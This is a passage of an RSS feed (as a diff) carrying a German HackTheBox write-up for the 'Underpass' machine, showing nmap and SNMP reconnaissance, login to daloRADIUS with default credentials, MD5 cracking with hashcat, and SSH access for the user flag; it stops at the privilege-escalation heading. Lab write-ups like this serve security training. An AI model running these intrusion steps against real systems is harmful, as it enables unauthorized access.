+&lt;p&gt;&lt;a href=&#34;https://www.veracrypt.fr/en/Home.html&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://www.veracrypt.fr/en/Home.html&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:3&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://european-alternatives.eu&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;https://european-alternatives.eu&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:3&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+    </description>
+    </item>
+    
+    <item>
+    <title>HackTheBox: Underpass</title>
+    <link>https://xenophil90.github.io/posts/2025/htb-underpass/</link>
+    <pubDate>Sun, 19 Jan 2025 09:00:00 +0100</pubDate>
+    <author>Phil Krämer</author>
+    <guid>https://xenophil90.github.io/posts/2025/htb-underpass/</guid>
+    <description>
+        &lt;h2 id=&#34;einleitung&#34;&gt;
+    &lt;a href=&#34;#einleitung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Einleitung
+&lt;/h2&gt;
+&lt;p&gt;Underpass ist eine als &lt;em&gt;Easy&lt;/em&gt; eingestufte Maschine auf HackTheBox. Sie wurde im Dezember 2024 veröffentlicht. Für die Lösung ist es notwendig, einen UDP-Portscan durchzuführen und Informationen über &lt;strong&gt;SNMP&lt;/strong&gt; zu erhalten. Diese Informationen werden anschließend genutzt, um ein &lt;strong&gt;Web-Interface&lt;/strong&gt; zu finden, Zugangsdaten zum Server zu finden und erfolgreich eine interaktive Verbindung aufzubauen. Anschließend nutzt man eine &lt;strong&gt;Konfigurationsschwachstelle&lt;/strong&gt; aus, um eine Applikation mit erweiterten Rechten zu starten und &lt;code&gt;root&lt;/code&gt;-Zugriff zu erhalten.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Dieser Artikel beschreibt die Lösung der Maschine und damit gilt: Spoileralarm!&lt;/strong&gt;&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-underpass-1.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&#34;erkundung&#34;&gt;
+    &lt;a href=&#34;#erkundung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Erkundung
+&lt;/h2&gt;
+&lt;p&gt;Zunächst wird das System mithilfe von &lt;code&gt;nmap&lt;/code&gt; gescannt. Um den Prozess zu vereinfachen, nutze ich dafür mein Skript mit dem Namen &lt;code&gt;fast-nmap&lt;/code&gt;&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[...]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| ssh-hostkey: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_http-server-header: Apache/2.4.52 (Ubuntu)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_http-title: Apache2 Ubuntu Default Page: It works
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[...]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Hierbei ist zu beachten, dass &lt;code&gt;nmap&lt;/code&gt; in der obigen Konfiguration nur TCP-Ports scannt, keine UDP-Ports. Der TCP-Scan ergibt zwei offenen Ports, nämlich &lt;strong&gt;22 (SSH)&lt;/strong&gt; und &lt;strong&gt;80 (Apache HTTP-Server)&lt;/strong&gt;. Auf den ersten (und zweiten) Blick ist hier nichts Interessantes zu holen.&lt;/p&gt;
+&lt;p&gt;Ich versuche mein Glück also mit einem UDP-Scan:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo nmap -A -sU -p- 10.10.11.48
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Das Ergebnis sieht u. a. wie folgt aus:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT    STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| snmp-info: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|   enterprise: net-snmp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|   engineIDFormat: unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|   engineIDData: c7ad5c4856d1cf6600000000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|   snmpEngineBoots: 30
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_  snmpEngineTime: 1h10m13s
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_  System uptime: 1h10m12.62s (421262 timeticks)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Too many fingerprints match this host to give specific OS details
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Network Distance: 2 hops
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Alle wichtigen Informationen sind in dieser Nachricht bereits enthalten, aber trotzdem schaue ich mithilfe von &lt;code&gt;snmpwalk&lt;/code&gt;, ob sich weitere Informationen finden lassen:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;snmpwalk -v &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -c public 10.10.11.48
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Wirklich neue Informationen erhalte ich dadurch allerdings nicht (daher beschreibe ich den Output hier auch nicht).&lt;/p&gt;
+&lt;p&gt;Die wichtige Information aus der Ausgabe oben ist diese hier:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;UnDerPass.htb is the only &lt;strong&gt;daloradius&lt;/strong&gt; server in the basin!&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;fuß-fassen&#34;&gt;
+    &lt;a href=&#34;#fu%c3%9f-fassen&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Fuß fassen
+&lt;/h2&gt;
+&lt;h3 id=&#34;daloradius&#34;&gt;
+    &lt;a href=&#34;#daloradius&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    daloRADIUS
+&lt;/h3&gt;
+&lt;p&gt;Was hat es nun aber mit &lt;strong&gt;daloRADIUS&lt;/strong&gt; auf sich?&lt;/p&gt;
+&lt;h4 id=&#34;was-ist-daloradius&#34;&gt;
+    &lt;a href=&#34;#was-ist-daloradius&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Was ist daloRADIUS?
+&lt;/h4&gt;
+&lt;p&gt;Laut der Hersteller-Webseite&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt; ist daloRADIUS wie folgt zu beschreiben:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;About daloRADIUS&lt;/p&gt;
+&lt;p&gt;daloRADIUS is an advanced RADIUS web platform aimed at managing Hotspots and general-purpose ISP deployments. It features rich user management, graphical reporting, accounting, and integrates with GoogleMaps for geo-locating (GIS). daloRADIUS is written in PHP and JavaScript and utilizes a database abstraction layer which means that it supports many database systems, among them the popular MySQL, PostgreSQL, Sqlite, MsSQL, and many others.&lt;/p&gt;
+&lt;p&gt;It is based on a FreeRADIUS deployment with a database server serving as the backend. Among other features it implements ACLs, GoogleMaps integration for locating hotspots/access points visually and many more features. &lt;strong&gt;daloRADIUS is essentially a web application to manage a radius server&lt;/strong&gt; so theoretically it can manage any radius server but specifically it manages FreeRADIUS and it&amp;rsquo;s database structure. Since version 0.9-3 daloRADIUS has introduced an application-wide database abstraction layer based on PHP&amp;rsquo;s PEAR::DB package which support a range of database servers.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Es handelt sich also um eine Web-Applikation. Deren Quellcode und Dokumentation sind auf Github verfügbar&lt;sup id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;h4 id=&#34;finden-des-web-interface&#34;&gt;
+    &lt;a href=&#34;#finden-des-web-interface&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Finden des Web-Interface
+&lt;/h4&gt;
+&lt;p&gt;Da es sich um eine Web-Applikation handelt und ich ein Github-Repository gefunden habe, in dem alle Daten zu daloRADIUS verfügbar sind, sollte es nicht schwer sein, das Webinterface zu finden. Tatsächlich komme ich im weiteren Verlauf auch ohne toolgestütztes Fuzzing oder Directory Busting zum Ziel.&lt;/p&gt;
+&lt;h5 id=&#34;der-richtige-pfad&#34;&gt;
+    &lt;a href=&#34;#der-richtige-pfad&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Der richtige Pfad
+&lt;/h5&gt;
+&lt;p&gt;Zunächst lohnt sich ein Blick in die Installations-Anweisungen von daloRADIUS&lt;sup id=&#34;fnref:4&#34;&gt;&lt;a href=&#34;#fn:4&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;4&lt;/a&gt;&lt;/sup&gt;, genauer gesagt auf das Kapitel 5:&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-underpass-2.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Hier erhalte ich die Standard-Zugangsdaten sowie einen möglichen Pfad zum Management-Interface auf dem Webserver. Leider wird unter der in der Dokumentation gezeigten Adresse auf dem von mir gerade begutachteten Server kein Login-Fenster angezeigt.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-underpass-3.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Die gute Nachricht:&lt;/strong&gt; Ich erhalte keinen Fehler 404, der bedeuten würde, dass es das Verzeichnis auf dem Server nicht gibt. Stattdessen schließe ich aus der Fehlermeldung, dass das Verzeichnis existiert, aber nicht zugänglich ist.&lt;/p&gt;
+&lt;p&gt;Nun heißt es also den Login zu finden&amp;hellip;&lt;/p&gt;
+&lt;h5 id=&#34;wo-ist-die-loginphp&#34;&gt;
+    &lt;a href=&#34;#wo-ist-die-loginphp&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Wo ist die Login.php?
+&lt;/h5&gt;
+&lt;p&gt;Dabei hilft mir auch die Tatsache, dass daloRADIUS öffentlich verfügbar ist. Nach kurzer Durchsicht des Github-Repositories finde ich hier&lt;sup id=&#34;fnref:5&#34;&gt;&lt;a href=&#34;#fn:5&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;5&lt;/a&gt;&lt;/sup&gt; eine &lt;code&gt;login.php&lt;/code&gt;:&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-underpass-4.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Dies probiere ich nun mit dem Webbrowser auf dem Server (&lt;code&gt;http://10.10.11.48/daloradius/app/operators/login.php&lt;/code&gt;) und finde tatsächlich das gesuchte Interface. Da ich die Standard-Zugangsdaten im Verlauf meiner Recherche bereits gefunden habe, teste ich diese direkt und erhalte tatsächlich Zugang zum Management-Interface!&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-underpass-5.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;h5 id=&#34;das-interface-erkunden&#34;&gt;
+    &lt;a href=&#34;#das-interface-erkunden&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Das Interface erkunden
+&lt;/h5&gt;
+&lt;p&gt;Im Interface lohnt es sich nun, alle Menüpunkt langsam einmal anzusehen. Unter anderem gibt es dort den Punkt &lt;em&gt;List Users&lt;/em&gt;. Dort werden alle im daloRADIUS-Server angelegten Benutzer samt eines gehashten Kennworts angezeigt. Interessant ist, dass es nur einen Benutzer gibt: &lt;code&gt;svcMosh&lt;/code&gt;.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-underpass-6.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Es gibt verschiedene Möglichkeiten herauszubekommen, um welche Art Hash es sich in diesem Fall handelt. Eine der einfachsten Varianten ist es, die Zeichenfolge in CyberChef&lt;sup id=&#34;fnref:6&#34;&gt;&lt;a href=&#34;#fn:6&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;6&lt;/a&gt;&lt;/sup&gt; einzugeben und analysieren zu lassen.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-underpass-7.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Damit wird schnell klar, dass es sich um einen MD5-Hash handelt.&lt;/p&gt;
+&lt;h3 id=&#34;das-gehashte-kennwort-bekommen&#34;&gt;
+    &lt;a href=&#34;#das-gehashte-kennwort-bekommen&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Das gehashte Kennwort bekommen
+&lt;/h3&gt;
+&lt;p&gt;Mithilfe von &lt;code&gt;hashcat&lt;/code&gt; versuche ich nun das Kennwort zu finden, das zur gefundenen MD5-Hashsumme passt. Als Wordlist nutze ich &lt;code&gt;rockyou.txt&lt;/code&gt;. Die Hashsumme habe ich vorher in der Datei &lt;code&gt;hash-list&lt;/code&gt; gespeichert.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hashcat -m &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; hash-list /usr/share/wordlists/rockyou.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nach sehr kurzer Zeit habe ich auch bereits ein Match (das Kennwort zeige ich an dieser Stelle natürlich nicht):&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-underpass-8.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;h3 id=&#34;user-flag&#34;&gt;
+    &lt;a href=&#34;#user-flag&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    User Flag
+&lt;/h3&gt;
+&lt;p&gt;Mit den gefundenen Zugangsdaten für den Benutzer &lt;code&gt;svcMosh&lt;/code&gt; ist nun ein Login via &lt;strong&gt;SSH&lt;/strong&gt; möglich.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-underpass-9.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Damit ist die User Flag schnell gefunden.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-underpass-10.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&#34;rechteerweiterung&#34;&gt;
